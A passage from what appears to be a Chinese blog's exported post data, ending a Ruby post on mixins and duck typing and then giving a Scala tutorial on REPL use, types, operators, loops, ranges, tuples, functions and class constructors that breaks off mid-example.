class=\"string\">&#x27;matz&#x27;</span>).to_f</span><br></pre></td></tr></table></figure><br>这里我们发现模块ToFile的to_f中调用了to_s，但是to_s是在调用了他的类里之后定义的，然而这里并不会报错，这说明了模块中可以调用可能会使用他的类的<strong>未实现</strong>的方法！！！然而这里定义模块的时候ruby显然是没有进行静态检查的，体现了ruby的鸭子类型，<strong>运行时</strong>才会进行检查。</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>Ruby的优点在与灵活性，提升了程序员的编程体验。和大多脚本语言一样，Ruby适用与做胶水语言，适合做爬虫。Ruby的web框架Rail也取得了巨大的成功。但Ruby的不足主要表现在：</p>\n<ul>\n<li>性能：ruby最大的弱点就是性能，但Robinius虚拟机已经用上了JIT，ruby1.9已经比上个版本快了十倍多。</li>\n<li>并发：面向对象的通病，面向对象的有状态性导致在并发条件下有很大的问题。</li>\n<li>类型安全：ruby是鸭子类型的支持者，无法在运行前做类型检查。例如mixin可以在对象没有创建时就调用其方法，这导致了一个问题就是ruby的IDE很难编写，市面上少有人开发ruby的IDE。</li>\n</ul>\n","categories":["《七周七语言》"],"tags":["Ruby"]},{"title":"七周七语言之-Scala","url":"/2020/02/21/%E4%B8%83%E5%91%A8%E4%B8%83%E8%AF%AD%E8%A8%80%E4%B9%8B-Scala/","content":"<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>Scala 是一门多范式（multi-paradigm）的编程语言，设计初衷是要集成面向对象编程和函数式编程的各种特性。Scala 运行在Java虚拟机上，并兼容现有的Java程序。Scala 源代码被编译成Java字节码，所以它可以运行于JVM之上，并可以调用现有的Java类库。</p>\n<p>Scala编译器的主要作者Martin Odersky也是Java编译器的开发者，他认为Scala是在面向对象之间搭起一座桥梁。所以不要把Scala当作一个完全陌生的语言与看待！他有着和Java类似强类型约束，有着Js类似的匿名箭头函数，类似C系语言的语法风格，类似Ruby的绝对面向对象，还有着和python等脚本语言一样灵活的高级数据结构，如果你有过这些语言的基础，学习Scala会是一个得心应手的过程。</p>\n<span id=\"more\"></span>\n<h2 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h2><p>Archlinux下<code>sudo pacman -S scala sbt</code>安装<code>sbt</code>和<code>scala</code>包，需要已有Java运行环境。</p>\n<p>Scala和源代码文件名为<code>*.scala</code>，使用<code>scalac</code>编译后产生同Java一样的<code>*.class</code>字节码文件，scala还提供了交互式编程环境，可以直接输入<code>scala</code>或者<code>sbt shell</code>启动scala shell，类似如下的界面：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">╭─xuranus@Thanos ~/githubProjects</span><br><span class=\"line\">╰─$ sbt console</span><br><span class=\"line\">[warn] No sbt.version set in project/build.properties, base directory: /home/xuranus/githubProjects</span><br><span class=\"line\">[info] Loading global plugins from /home/xuranus/.sbt/1.0/plugins</span><br><span class=\"line\">[info] Set current project to githubprojects (in build file:/home/xuranus/githubProjects/)</span><br><span class=\"line\">[info] Starting scala interpreter...</span><br><span class=\"line\">Welcome to Scala 2.12.10 (OpenJDK 64-Bit Server VM, Java 13.0.2).</span><br><span class=\"line\">Type in expressions for evaluation. Or try :help.</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">scala&gt;</span></span><br></pre></td></tr></table></figure>\n<p>接下里你可以直接在控制台里尝试本文的案例，你的第一个scala程序：HelloWorld<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; println(<span class=\"string\">&quot;hello world&quot;</span>)</span><br><span class=\"line\">hello world</span><br><span class=\"line\">scala&gt; <span class=\"type\">System</span>.out.println(<span class=\"string\">&quot;hello world&quot;</span>)</span><br><span class=\"line\">hello world</span><br></pre></td></tr></table></figure><br>我们用两种不同的方式输出了“hello world”，第一种是scala推荐的方式，第二中是调用了java的原生的方法。这说明scala可以调用java的api。</p>\n<h2 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h2><h3 id=\"基本数据类型\"><a href=\"#基本数据类型\" class=\"headerlink\" title=\"基本数据类型\"></a>基本数据类型</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; val a = 10</span><br><span class=\"line\">a: Int = 10</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; val b = 10.5</span><br><span class=\"line\">b: Double = 10.5</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; val c = &quot;Hello&quot;</span><br><span class=\"line\">c: String = Hello</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; val d:Int = 20</span><br><span class=\"line\">d: Int = 20</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; var e:Int = 30</span><br><span class=\"line\">e: Int = 30</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; c + d</span><br><span class=\"line\">res14: String = Hello20</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; 3 * &quot;Hello&quot;</span><br><span class=\"line\">&lt;console&gt;:12: error: overloaded method value * with alternatives:</span><br><span class=\"line\">  (x: Double)Double &lt;and&gt;</span><br><span class=\"line\">  (x: Float)Float &lt;and&gt;</span><br><span class=\"line\">  (x: Long)Long &lt;and&gt;</span><br><span class=\"line\">  (x: Int)Int &lt;and&gt;</span><br><span class=\"line\">  (x: Char)Int &lt;and&gt;</span><br><span class=\"line\">  (x: Short)Int &lt;and&gt;</span><br><span class=\"line\">  (x: Byte)Int</span><br><span class=\"line\"> cannot be applied to (String)</span><br><span class=\"line\">       3 * &quot;Hello&quot;</span><br><span class=\"line\">         ^</span><br></pre></td></tr></table></figure>\n<p>Scala使用<code>var</code>和<code>val</code>来申明一个量，和Java一样支持所有的基本数据类型，Scala同Java一样是强类型语言，运算的类型之间必须匹配才能运算，否则会错误。Scala支持声明变量的时候无须声明类型，因为Scala支持静态类型推导，不同于解释性语言，Scala的类型检查在编译期完成。（Java8之后也加入了var关键字，同样支持了静态类型推导，C++11的auto关键字也是如此）</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; d = <span class=\"number\">21</span></span><br><span class=\"line\">&lt;console&gt;:<span class=\"number\">12</span>: error: reassignment to <span class=\"keyword\">val</span></span><br><span class=\"line\">       d = <span class=\"number\">21</span></span><br><span class=\"line\">         ^</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; e = <span class=\"number\">31</span></span><br><span class=\"line\">e: <span class=\"type\">Int</span> = <span class=\"number\">31</span></span><br></pre></td></tr></table></figure>\n<p><code>var</code>声明的是变量，可以修改，<code>val</code>声明的不可以修改（对应Java中的final）。但是Scala编程应该尽可能使用不变量，结合Scala的函数编程特性，可以有效提高并发性能。</p>\n<h3 id=\"基本运算符\"><a href=\"#基本运算符\" class=\"headerlink\" title=\"基本运算符\"></a>基本运算符</h3><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"number\">1</span>+<span class=\"number\">1</span></span><br><span class=\"line\">res5: <span class=\"type\">Int</span> = <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"number\">1.</span>+(<span class=\"number\">1</span>)</span><br><span class=\"line\">res6: <span class=\"type\">Int</span> = <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"number\">3</span>*(<span class=\"number\">5</span>+<span class=\"number\">6</span>)</span><br><span class=\"line\">res7: <span class=\"type\">Int</span> = <span class=\"number\">33</span>              ^</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"number\">3.</span>*(<span class=\"number\">5.</span>+(<span class=\"number\">6</span>))</span><br><span class=\"line\">res8: <span class=\"type\">Int</span> = <span class=\"number\">33</span></span><br></pre></td></tr></table></figure>\n<p>我们可以看到，scala的数值运算和其他高级语言无异同，但其原理却大有文章！scala并没有像Java一样特殊处理了基础类型（int，float之类）和运算符，Java在基本数据类型运算中没能做到完全的面向对象，所以Java不是一门完全面向对象的语言，如果完全面向对象，<code>a + b</code>应该被写作<code>a.add(b)</code>。</p>\n<p>但是这样显然很不直观，scala为了在完全面向对象的同时，继续保持运算符的优点，scala的运算符实际上是一种<strong>语法糖</strong>，<code>1 + 1</code>实际上的含义是<code>1.+(1)</code>，<code>.+()</code>类似<code>.add()</code>实际上是一个方法，由于scala单个参数可以省略括号和点，于是最后的形式还是上述那样。</p>\n<p>Java在原生类型和对象直接要做封包和解包，例如Integer和int，而scala真正做到了万物皆对象。</p>\n<h3 id=\"表达式与条件\"><a href=\"#表达式与条件\" class=\"headerlink\" title=\"表达式与条件\"></a>表达式与条件</h3><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"number\">1</span> &lt; <span class=\"number\">3</span></span><br><span class=\"line\">res16: <span class=\"type\">Boolean</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> a = (<span class=\"number\">2</span> &gt; <span class=\"number\">1</span>)</span><br><span class=\"line\">a: <span class=\"type\">Boolean</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; a</span><br><span class=\"line\">res17: <span class=\"type\">Boolean</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">if</span>(a) &#123;</span><br><span class=\"line\">     |   print(<span class=\"string\">&quot;this is true&quot;</span>)</span><br><span class=\"line\">     | &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">     |   print(<span class=\"string\">&quot;this is false&quot;</span>)</span><br><span class=\"line\">     | &#125;</span><br><span class=\"line\"><span class=\"keyword\">this</span> is <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<p>Scala的逻辑语句，类似C语言风格，清晰易懂，无需赘述。需要注意的是他对空值和0的逻辑判断：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"type\">Nil</span></span><br><span class=\"line\">res19: scala.collection.immutable.<span class=\"type\">Nil</span>.<span class=\"keyword\">type</span> = <span class=\"type\">List</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"type\">NULL</span></span><br><span class=\"line\">&lt;console&gt;:<span class=\"number\">12</span>: error: not found: value <span class=\"type\">NULL</span></span><br><span class=\"line\">       <span class=\"type\">NULL</span></span><br><span class=\"line\">       ^</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">if</span>(<span class=\"number\">0</span>) &#123;print(<span class=\"string\">&quot;True&quot;</span>)&#125;</span><br><span class=\"line\">&lt;console&gt;:<span class=\"number\">12</span>: error: <span class=\"class\"><span class=\"keyword\">type</span> <span class=\"title\">mismatch</span></span>;</span><br><span class=\"line\"> found   : <span class=\"type\">Int</span>(<span class=\"number\">0</span>)</span><br><span class=\"line\"> required: <span class=\"type\">Boolean</span></span><br><span class=\"line\">       <span class=\"keyword\">if</span>(<span class=\"number\">0</span>) &#123;print(<span class=\"string\">&quot;True&quot;</span>)&#125;</span><br><span class=\"line\">          ^</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">if</span>(<span class=\"type\">Nil</span>) &#123;print(<span class=\"string\">&quot;True&quot;</span>)&#125;</span><br><span class=\"line\">&lt;console&gt;:<span class=\"number\">12</span>: error: <span class=\"class\"><span class=\"keyword\">type</span> <span class=\"title\">mismatch</span></span>;</span><br><span class=\"line\"> found   : scala.collection.immutable.<span class=\"type\">Nil</span>.<span class=\"keyword\">type</span></span><br><span class=\"line\"> required: <span class=\"type\">Boolean</span></span><br><span class=\"line\">       <span class=\"keyword\">if</span>(<span class=\"type\">Nil</span>) &#123;print(<span class=\"string\">&quot;True&quot;</span>)&#125;</span><br><span class=\"line\">          ^</span><br></pre></td></tr></table></figure><br>Scala中的空值不是<code>NULL</code>，而是<code>Nil</code>,一个空列表。且不同于其他语言，Scala严谨的强类型特性不允许在逻辑判断中使用0/1/Nil代替布尔值。</p>\n<h3 id=\"循环结构‘\"><a href=\"#循环结构‘\" class=\"headerlink\" title=\"循环结构‘\"></a>循环结构‘</h3><ol>\n<li><p>while循环：</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> i = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>(i &lt; <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">  println(i)</span><br><span class=\"line\">  i += <span class=\"number\">1</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>for循环：</p>\n<figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(j &lt;- <span class=\"number\">0</span> until <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">  println(j)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0</span><br><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"范围与元组\"><a href=\"#范围与元组\" class=\"headerlink\" title=\"范围与元组\"></a>范围与元组</h3><p>scala支持类似ruby的特性：范围range<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> range = <span class=\"number\">0</span> until <span class=\"number\">10</span></span><br><span class=\"line\">range: scala.collection.immutable.<span class=\"type\">Range</span> = <span class=\"type\">Range</span> <span class=\"number\">0</span> until <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; range.start</span><br><span class=\"line\">res3: <span class=\"type\">Int</span> = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; range.end</span><br><span class=\"line\">res4: <span class=\"type\">Int</span> = <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; range.step</span><br><span class=\"line\">res5: <span class=\"type\">Int</span> = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; (<span class=\"number\">0</span> to <span class=\"number\">10</span>)</span><br><span class=\"line\">res6: scala.collection.immutable.<span class=\"type\">Range</span>.<span class=\"type\">Inclusive</span> = <span class=\"type\">Range</span> <span class=\"number\">0</span> to <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; (<span class=\"number\">0</span> to <span class=\"number\">10</span>) by <span class=\"number\">5</span></span><br><span class=\"line\">res7: scala.collection.immutable.<span class=\"type\">Range</span> = <span class=\"type\">Range</span> <span class=\"number\">0</span> to <span class=\"number\">10</span> by <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; ((<span class=\"number\">0</span> to <span class=\"number\">10</span>) by <span class=\"number\">5</span>).start</span><br><span class=\"line\">res8: <span class=\"type\">Int</span> = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; ((<span class=\"number\">0</span> to <span class=\"number\">10</span>) by <span class=\"number\">5</span>).end</span><br><span class=\"line\">res9: <span class=\"type\">Int</span> = <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; ((<span class=\"number\">0</span> to <span class=\"number\">10</span>) by <span class=\"number\">5</span>).step</span><br><span class=\"line\">res10: <span class=\"type\">Int</span> = <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; (<span class=\"number\">0</span> until <span class=\"number\">10</span>) by <span class=\"number\">5</span></span><br><span class=\"line\">res11: scala.collection.immutable.<span class=\"type\">Range</span> = <span class=\"type\">Range</span> <span class=\"number\">0</span> until <span class=\"number\">10</span> by <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; ((<span class=\"number\">0</span> until <span class=\"number\">10</span>)).end</span><br><span class=\"line\">res12: <span class=\"type\">Int</span> = <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; &#x27;a&#x27; to &#x27;e&#x27;</span><br><span class=\"line\">res14: scala.collection.immutable.<span class=\"type\">NumericRange</span>.<span class=\"type\">Inclusive</span>[<span class=\"type\">Char</span>] = <span class=\"type\">NumericRange</span> a to e</span><br></pre></td></tr></table></figure><br>range可以改变范围变化的方向：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">for</span>(i &lt;- (<span class=\"number\">10</span> until <span class=\"number\">0</span>) by <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">     |   print(i)</span><br><span class=\"line\">     | &#125;</span><br><span class=\"line\"><span class=\"number\">10987654321</span></span><br></pre></td></tr></table></figure><br>类似Prolog，Scala支持元组（tuple）—一个固定长度的对象集合，在函数式编程中表示对象的属性，例如：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> person = (<span class=\"string\">&quot;Elvis&quot;</span>,<span class=\"string\">&quot;Presley&quot;</span>)</span><br><span class=\"line\">person: (<span class=\"type\">String</span>, <span class=\"type\">String</span>) = (<span class=\"type\">Elvis</span>,<span class=\"type\">Presley</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; person._1</span><br><span class=\"line\">res15: <span class=\"type\">String</span> = <span class=\"type\">Elvis</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; person._2</span><br><span class=\"line\">res16: <span class=\"type\">String</span> = <span class=\"type\">Presley</span></span><br></pre></td></tr></table></figure><br>Scala中还用元组进行多值赋值：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> (x, y) = (<span class=\"number\">1</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\">x: <span class=\"type\">Int</span> = <span class=\"number\">1</span></span><br><span class=\"line\">y: <span class=\"type\">Int</span> = <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; x</span><br><span class=\"line\">res18: <span class=\"type\">Int</span> = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; y</span><br><span class=\"line\">res19: <span class=\"type\">Int</span> = <span class=\"number\">2</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"函数-方法\"><a href=\"#函数-方法\" class=\"headerlink\" title=\"函数/方法\"></a>函数/方法</h3><p>Scala的函数定义可以使用<code>def</code>关键字，参数列表需要声明参数类型，定义一个返回加一的方法<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">addOne</span></span>(x:<span class=\"type\">Int</span>):<span class=\"type\">Int</span> = &#123;</span><br><span class=\"line\">     |   <span class=\"keyword\">return</span> x + <span class=\"number\">1</span></span><br><span class=\"line\">     | &#125;</span><br><span class=\"line\">addOne: (x: <span class=\"type\">Int</span>)<span class=\"type\">Int</span></span><br></pre></td></tr></table></figure><br>成功定义了函数，因为返回值在最后一行，不需要声明<code>return</code>关键字，去掉后再次定义：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">addOne</span></span>(x:<span class=\"type\">Int</span>):<span class=\"type\">Int</span> = &#123;</span><br><span class=\"line\">     |   x + <span class=\"number\">1</span></span><br><span class=\"line\">     | &#125;</span><br><span class=\"line\">addOne: (x: <span class=\"type\">Int</span>)<span class=\"type\">Int</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; addOne(<span class=\"number\">1</span>)</span><br><span class=\"line\">res4: <span class=\"type\">Int</span> = <span class=\"number\">2</span></span><br></pre></td></tr></table></figure><br>Scala还可以用匿名函数的定义方式，将函数直接申明为一个匿名函数，使用<code>=&gt;</code>表明映射关系，将函数定义成一个变量:<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> addTwo = (x:<span class=\"type\">Int</span>) =&gt; x + <span class=\"number\">2</span></span><br><span class=\"line\">addTwo: <span class=\"type\">Int</span> =&gt; <span class=\"type\">Int</span> = $$<span class=\"type\">Lambda</span>$<span class=\"number\">4051</span>/<span class=\"number\">0x00000001013f0040</span>@<span class=\"number\">2</span>d93a219</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; addTwo(<span class=\"number\">2</span>)</span><br><span class=\"line\">res29: <span class=\"type\">Int</span> = <span class=\"number\">4</span></span><br></pre></td></tr></table></figure><br>函数在Scala中和Integer，Float等基础类型一样，是Scala的“一等公民”，可以被作为参数传递，我们定义一个increase方法，传入一个函数和一个值：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">increase</span></span>(x:<span class=\"type\">Int</span>, f:<span class=\"type\">Int</span>=&gt;<span class=\"type\">Int</span>)=&#123;</span><br><span class=\"line\">     |   f(x)</span><br><span class=\"line\">     | &#125;</span><br><span class=\"line\">increase: (x: <span class=\"type\">Int</span>, f: <span class=\"type\">Int</span> =&gt; <span class=\"type\">Int</span>)<span class=\"type\">Int</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; increase(<span class=\"number\">5</span>,addOne)</span><br><span class=\"line\">res5: <span class=\"type\">Int</span> = <span class=\"number\">6</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; increase(<span class=\"number\">5</span>,addTwo)</span><br><span class=\"line\">res6: <span class=\"type\">Int</span> = <span class=\"number\">7</span></span><br></pre></td></tr></table></figure><br>其中第一个参数表是一个整数，第二个参数是一个函数，函数作为参数时候需要声明其类型签名。Scala中所有的函数都有返回值，对于某些不写返回值的函数，scala会先进行静态类型推导，对于空返回，其返回类型是<code>Unit</code>:<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> nonReturnFunc = ()=&gt;()</span><br><span class=\"line\">nonReturnFunc: () =&gt; <span class=\"type\">Unit</span> = $$<span class=\"type\">Lambda</span>$<span class=\"number\">3914</span>/<span class=\"number\">0x000000010132ec40</span>@<span class=\"number\">9</span>a60a4b</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Scala中的类\"><a href=\"#Scala中的类\" class=\"headerlink\" title=\"Scala中的类\"></a>Scala中的类</h3><p>Scala中可以用一行代码定义那些只有属性而没有方法或构造器的简单类：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span>(<span class=\"params\">firstName: <span class=\"type\">String</span>, lastName: <span class=\"type\">String</span></span>)</span></span><br><span class=\"line\">defined <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> gump = <span class=\"keyword\">new</span> <span class=\"type\">Person</span>(<span class=\"string\">&quot;Forest&quot;</span>,<span class=\"string\">&quot;Gump&quot;</span>)</span><br><span class=\"line\">gump: <span class=\"type\">Person</span> = <span class=\"type\">Person</span>@<span class=\"number\">4810</span>b744</span><br></pre></td></tr></table></figure><br>我们来定义一个稍微复杂点的类，来看看Scala中的成员变量和方法：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class Light &#123;</span><br><span class=\"line\">  var status = &quot;on&quot;</span><br><span class=\"line\">  println(&quot;you build a light!&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  def turnOn() &#123;</span><br><span class=\"line\">    status = &quot;on&quot;</span><br><span class=\"line\">    println(&quot;you turned on the light!&quot;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  def turnOff() &#123;</span><br><span class=\"line\">    status = &quot;off&quot;</span><br><span class=\"line\">    println(&quot;you turned off the light!&quot;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  def showStatus()= &#123;</span><br><span class=\"line\">    status</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>你可能发现了此处除了除了<code>showStatus</code>之外都没有等号，这是因为如果<strong>既没有声明返回类型，有没有使用等号，则返回的都是()</strong>，这样的方法扮演过程的角色，反回值意义不大。</p>\n<p>我们定义了一个灯类，成员变量有灯的开关状态，其中前两句不在任何方法中，这两行实际上是构造方法，当实例化这个类时，默认执行外构造方法的语句：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> light = <span class=\"keyword\">new</span> <span class=\"type\">Light</span></span><br><span class=\"line\">you build a light!</span><br><span class=\"line\">light: <span class=\"type\">Light</span> = <span class=\"type\">Light</span>@<span class=\"number\">13</span>dae13</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> light2 = <span class=\"keyword\">new</span> <span class=\"type\">Light</span>()</span><br><span class=\"line\">you build a light!</span><br><span class=\"line\">light2: <span class=\"type\">Light</span> = <span class=\"type\">Light</span><span class=\"meta\">@d</span>74061f</span><br></pre></td></tr></table></figure><br>如果构造参数为空，不需要括号，我们执行对象中的方法，可以看到如下效果：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; light.showStatus()</span><br><span class=\"line\">res19: String = on</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; light.turnOff()</span><br><span class=\"line\">you turned off the light!</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; light.showStatus()</span><br><span class=\"line\">res21: String = off</span><br></pre></td></tr></table></figure><br>但是面向对象的构造方法往往不止一个，当遇到多个构造方法的需求时，则需要引入辅助构造方法，如下一个例子：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span>(<span class=\"params\">val firstName:<span class=\"type\">String</span></span>) </span>&#123;</span><br><span class=\"line\">  println(<span class=\"string\">&quot;you used outer constructor!&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">this</span></span>(firstName:<span class=\"type\">String</span>,lastName:<span class=\"type\">String</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>(firstName)</span><br><span class=\"line\">    println(<span class=\"string\">&quot;you used inner constructor 1!&quot;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">this</span></span>(firstName:<span class=\"type\">String</span>, lastName:<span class=\"type\">String</span>, age:<span class=\"type\">Int</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>(firstName, lastName)</span><br><span class=\"line\">    println(<span class=\"string\">&quot;you used inner constructor 2!&quot;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>我们定义了一个Person类，有三个构造方法，一个是外层主构造器，参数列表直接写在类的后面，构造体直接写在类里。两个辅助构造器通过重载<code>this</code>方法实现多构造<br>实例化输出如下：<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> p1 = <span class=\"keyword\">new</span> <span class=\"type\">Person</span>(<span class=\"string\">&quot;Forest&quot;</span>)</span><br><span class=\"line\">you used outer constructor!</span><br><span class=\"line\">p1: <span class=\"type\">Person</span> = <span class=\"type\">Person</span>@<span class=\"number\">7</span>b78909a</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> p2 = <span class=\"keyword\">new</span> <span class=\"type\">Person</span>(<span class=\"string\">&quot;Forest&quot;</span>,<span class=\"string\">&quot;Gump&quot;</span>)</span><br><span class=\"line\">you used outer constructor!</span><br><span class=\"line\">you used inner constructor <span class=\"number\">1</span>!</span><br><span class=\"line\">p2: <span class=\"type\">Person</span> = <span class=\"type\">Person</span>@<span class=\"number\">5</span>ba69762</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> p3 = <span class=\"keyword\">new</span> <span class=\"type\">Person</span>(<span class=\"string\">&quot;Forest&quot;</span>,<span class=\"string\">&quot;Gump&quot;</span>,<span class=\"number\">30</span>)</span><br><span class=\"line\">you used outer constructor!</span><br><span class=\"line\">you used inner constructor <span class=\"number\">1</span>!</span><br><span class=\"line\">you used inner constructor <span class=\"number\">2</span>!</span><br><span class=\"line\">p3: <span class=\"type\">Person</span> = <span class=\"type\">Person</span>@<span class=\"number\">41</span>f96dd8</span><br></pre></td></tr></table></figure><br>我们注意到主构造器的<code>firstName</code>参数使用了<code>val</code>修饰符，这说明<code>firstName</code>将直接成为该实例的成员变量！<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; p3.firstName</span><br><span class=\"line\">res4: String = Forest</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; 